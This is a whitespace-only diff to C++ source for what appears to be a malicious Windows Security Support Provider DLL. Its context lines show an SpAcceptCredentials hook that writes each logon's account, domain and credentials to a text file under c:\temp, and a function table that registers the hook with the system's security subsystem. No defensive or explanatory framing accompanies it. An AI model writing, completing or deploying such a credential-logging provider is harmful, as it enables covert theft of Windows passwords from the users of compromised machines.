@@ -125,7 +125,7 @@ NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRIN
 {
 	HANDLE outFile = CreateFile(L"c:\\temp\\logged-pw.txt", FILE_GENERIC_WRITE, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	DWORD bytesWritten = 0;
-	
+
 	std::wstring log = L"";
 	std::wstring account = AccountName->Buffer;
 	std::wstring domain = PrimaryCredentials->DomainName.Buffer;
@@ -137,10 +137,10 @@ NTSTATUS NTAPI SpAcceptCredentials(SECURITY_LOGON_TYPE LogonType, PUNICODE_STRIN
 	return 0;
 }
 
-SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] = 
+SECPKG_FUNCTION_TABLE SecurityPackageFunctionTable[] =
 {
 	{
-		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,	SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL 
+		NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL,	SpInitialize, SpShutDown, SpGetInfo, SpAcceptCredentials, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL
 	}
 };
 
